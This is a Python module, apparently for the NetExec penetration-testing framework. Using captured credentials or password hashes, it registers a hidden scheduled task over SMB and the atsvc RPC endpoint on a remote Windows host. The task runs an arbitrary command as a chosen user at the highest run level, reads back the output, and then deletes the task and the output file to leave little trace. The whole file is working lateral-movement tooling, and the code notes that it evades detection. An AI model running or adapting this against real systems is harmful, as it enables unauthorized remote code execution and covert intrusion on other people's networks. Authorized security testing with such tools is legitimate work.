#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep

class NXCModule:
    """
    Execute a scheduled task remotely as a already connected user by @Defte_
    """

    def options(self, context, module_options):
        """
        CMD            Command to execute
        USER           User to execute the command as
        """

        self.cmd = self.user = self.time = None
        if "CMD" in module_options:
            self.cmd = module_options["CMD"]
        
        if "USER" in module_options:
            self.user = module_options["USER"]
       
    name = "schtask"
    description = "Execute a scheduled task on the remote system"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False
    
    def on_admin_login(self, context, connection):
        self.logger = context.log
        if self.cmd is None:
            self.logger.fail("You need to specify a CMD to run")
            return 1
        if self.user is None:
            self.logger .fail("You need to specify a USER to run the command as") 
            return 1

        self.logger.display("Connecting to the remote atsvc endpoint")
        try:
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                self.user,
                self.cmd,
                connection.kerberos,
                connection.aesKey,
                connection.kdcHost,
                connection.hash,
                self.logger,
                connection.args.get_output_tries,
                "C$" # This one shouldn't be hardcoded but I don't know where to retrive the info
            )

            output = exec_method.execute(self.cmd, True)
            try:
                if not isinstance(output, str):
                    output = output.decode(connection.args.codec)
            except UnicodeDecodeError:
                self.logger.fail("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
            self.logger.highlight(output)

        except Exception as e:
            self.logger.fail(f"Error executing command via atexec, traceback: {e}")

class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, user, cmd, doKerberos=False, aesKey=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger
        self.cmd = cmd
        self.user = user

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = f"ncacn_np:{self.__target}[\\pipe\\atsvc]"
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def gen_xml(self, command, fileless=False):
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>{self.user}</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>/C {command}</Arguments>"

        self.logger.debug("Generated argument XML: " + argument_xml)
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        
        tmpName = gen_random_string(8)

        xml = self.gen_xml(command, fileless)

        self.logger.info(f"Task XML: {xml}")
        taskCreated = False
        self.logger.info(f"Creating task \\{tmpName}")
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            return
        else:
            taskCreated = True

        self.logger.info(f"Running task \\{tmpName}")
        tsch.hSchRpcRun(dce, f"\\{tmpName}")

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{tmpName}")
            resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{tmpName}")
        tsch.hSchRpcDelete(dce, f"\\{tmpName}")
        taskCreated = False

        if taskCreated is True:
            tsch.hSchRpcDelete(dce, "\\%s" % tmpName)

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join("/tmp", "nxc_hosted", self.__output_filename), "r") as output:
                            self.output_callback(output.read())
                        break
                    except IOError:
                        sleep(2)
            else:
                peer = ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()
                tries = 1
                while True:
                    try:
                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail(f"ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                            break
                        if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        if str(e).find("SHARING") > 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
                            sleep(3)
                            tries += 1
                        else:
                            self.logger.debug(str(e))

                if self.__outputBuffer:
                    self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                    smbConnection.deleteFile(self.__share, self.__output_filename)

        dce.disconnect()
